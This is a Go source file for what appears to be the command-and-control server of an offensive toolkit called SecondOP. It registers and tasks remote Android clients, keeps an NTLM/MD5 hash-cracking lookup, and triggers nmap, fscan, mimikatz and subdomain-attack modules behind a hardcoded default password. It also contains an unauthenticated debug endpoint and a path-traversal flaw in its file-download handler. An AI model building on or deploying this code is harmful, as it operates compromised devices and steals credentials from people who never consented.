package main

import (
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"strconv"

	"github.com/UD94/SecondOP/Common"
	"github.com/UD94/SecondOP/Function"
)

var channel_password string
var ntlmdb *sql.DB
var linedb *sql.DB
var androids []string
var UserAgent string

type AutoGenerated struct {
	Password string   `json:"Password"`
	Doldfile bool     `json:"Doldfile"`
	Action   string   `json:"Action"`
	Type     string   `json:"type"`
	Content  []string `json:"Content"`
}

type ResponseJson struct {
	Code    int      `json:"code"`
	Content []string `json:"Content"`
}

func HandlePostJson(w http.ResponseWriter, r *http.Request) {
	// 根据请求body创建一个json解析器实例
	UserAgent = r.UserAgent()
	var get_result AutoGenerated
	var ResponseString ResponseJson
	data, err := ioutil.ReadAll(r.Body)

	json.Unmarshal(data, &get_result)
	if err != nil {
		return
	}

	if get_result.Password != channel_password {
		ResponseString.Code = 5
		ResponseString.Content = append(ResponseString.Content, "access denied")

	} else {
		switch get_result.Action {
		case "dnsresolvr":
			go Function.Dns_thread(get_result.Content[0])

			go Function.Google_domain(get_result.Content[0])
			ResponseString.Code = 0
		case "config":

			returncode, _ := Config_Workstation(get_result.Type, get_result.Content, get_result.Doldfile)

			ResponseString.Code = returncode
			ResponseString.Content = append(ResponseString.Content, "config")

		case "md5":
			result, err := Function.Md5_query(ntlmdb, get_result.Content[0])
			if err != nil {
				switch result {
				case "nopass":

					ResponseString.Code = 7
					ResponseString.Content = append(ResponseString.Content, "not found")
				case "nodatabse":

					ResponseString.Code = 8
					ResponseString.Content = append(ResponseString.Content, "database not ready")
				}
			} else {
				ResponseString.Code = 0
				ResponseString.Content = append(ResponseString.Content, result)
			}

		case "analysis":
			switch get_result.Type {
			case "nmap":
				Function.Nmap()
			case "fscan":
				Function.Fscan()
			case "mimikatz":
				Function.Mimikatz(get_result.Content)
			}
		case "subhack":
			Function.Subhackdomain()

		case "query":
			switch get_result.Type {
			case "androidlist":
				ResponseString.Content = androids
				ResponseString.Code = 0
			case "joblist":
				file, _ := os.Open("Cache\\" + get_result.Content[0])
				defer file.Close()

				fileHeader := make([]byte, 512)
				file.Read(fileHeader)

				fileStat, _ := file.Stat()

				w.Header().Set("Content-Disposition", "attachment; filename="+get_result.Content[0])
				w.Header().Set("Content-Type", http.DetectContentType(fileHeader))
				w.Header().Set("Content-Length", strconv.FormatInt(fileStat.Size(), 10))

				file.Seek(0, 0)
				io.Copy(w, file)
				ResponseString.Code = 0
			}

		case "line":

			htmls, err := Function.Linequery(linedb, w, get_result.Content[0], get_result.Content[1], get_result.Content[2])
			if err != nil {
				ResponseString.Code = 13
			} else {
				ResponseString.Code = 0
				ResponseString.Content = append(ResponseString.Content, htmls)
			}

		default:

			files, err := ioutil.ReadDir(`Cache`)
			if err != nil {
				panic(err)
			}
			ResponseString.Code = 0
			for _, v := range files {
				ResponseString.Content = append(ResponseString.Content, v.Name())
			}

		}

	}
	response, _ := json.Marshal(ResponseString)
	fmt.Fprint(w, string(response))

}

func Config_Workstation(configtype string, content []string, Doldfile bool) (int, error) {
	switch configtype {
	case "dnsdomainconfig":
		if Doldfile {
			Common.DeleteFile("domain.txt")
		}
		for _, s := range content {
			Common.Write_result(s+"\n", "domain.txt")
		}
	case "androidonline":
		X, _ := base64.StdEncoding.DecodeString(content[0])
		Y, _ := base64.StdEncoding.DecodeString(content[1])

		_, err := Function.Lineinsert(linedb, string(X), string(Y), content[2], content[3], UserAgent)
		if err != nil {
			return 13, errors.New("onlineconfigerror")
		}
		code, _ := Function.Androidjobqeury(linedb, content[3])
		int1, _ := strconv.Atoi(code)
		androids, _ = Function.Linelist(linedb)

		return int1, nil

	case "md5config":
		_, err := Function.MD5_insert(ntlmdb, content[0], content[1])
		if err != nil {
			return 13, errors.New("md5configerror")
		}

	case "androidjob":
		var err error
		switch content[0] {
		case "Delete":
			_, err = Function.Androidjob(linedb, content[1], "66")
		case "Reverso":
			_, err = Function.Androidjob(linedb, content[1], "67")
		case "Message":
			_, err = Function.Androidjob(linedb, content[1], "68")
		}
		if err != nil {
			return 14, errors.New("joberror")
		}
		return 0, nil
	default:
		return 15, errors.New("not config")
	}
	return 0, nil
}

func Starthttps(ip string) {
	http.HandleFunc("/post", HandlePostJson)

	err := http.ListenAndServeTLS(ip+":443", "cert.pem", "privkey.pem", nil)
	if err != nil {
		log.Fatal("listen error:", err.Error())
	}
}

func Starthttp(ip string) {
	http.HandleFunc("/post", HandlePostJson)
	http.HandleFunc("/debug", debug)
	http.ListenAndServe(":80", nil)

}

func debug(w http.ResponseWriter, r *http.Request) {
	data, err := ioutil.ReadAll(r.Body)
	if err != nil {
		return
	}
	linedb.Exec("insert into androids.debug(data) values(?)", string(data))
	fmt.Fprint(w, string(data))

}

func main() {

	var ip string
	var ssl string
	flag.StringVar(&channel_password, "p", "ud94iscreater", "连接密码,默认为ud94iscreater")
	flag.StringVar(&ip, "i", "0.0.0.0", "监听ip,默认为0.0.0.0")
	flag.StringVar(&ssl, "s", "false", "是否启用ssl，默认为false")
	flag.Parse()
	ntlmdb, _ = Common.InitDB("ntlm")
	linedb, _ = Common.InitDB("androids")
	androids, _ = Function.Linelist(linedb)

	if ssl == "false" {
		Starthttp(ip)
	} else {
		Starthttps(ip)
	}

}
